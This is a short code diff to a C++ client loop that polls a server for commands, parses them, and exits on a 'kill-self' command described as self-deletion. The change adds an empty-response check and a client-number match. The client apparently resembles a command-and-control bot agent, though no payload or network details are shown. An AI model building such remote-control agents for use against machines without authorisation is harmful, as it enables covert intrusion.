@@ -185,7 +185,8 @@ int main() {
 
     //Connect to server and get client number
     CLIENTNUMBER = 1;
-    LASTCOMMAND = "";    
+    LASTCOMMAND = "";
+    struct Command newCmd;    
 
     if (os_name == "Linux") {
         while(1)
@@ -194,11 +195,15 @@ int main() {
             string outputTest = get_command();
             outputTest = strip_responce_string(outputTest);
 
-            //Parse Data for Use
-            struct Command newCmd;
-            parse_command(newCmd, outputTest);
+            if(outputTest != "")
+            {
+                //Parse Data for Use
+                
+                parse_command(newCmd, outputTest);
+            }
 
-            if(newCmd.command == "\"kill-self\"")
+            //Checks to make sure the command to remove itself has not been called
+            if(newCmd.ClientNumber == CLIENTNUMBER && newCmd.command == "\"kill-self\"")
             {
                 //self delete the program
                 return 0;
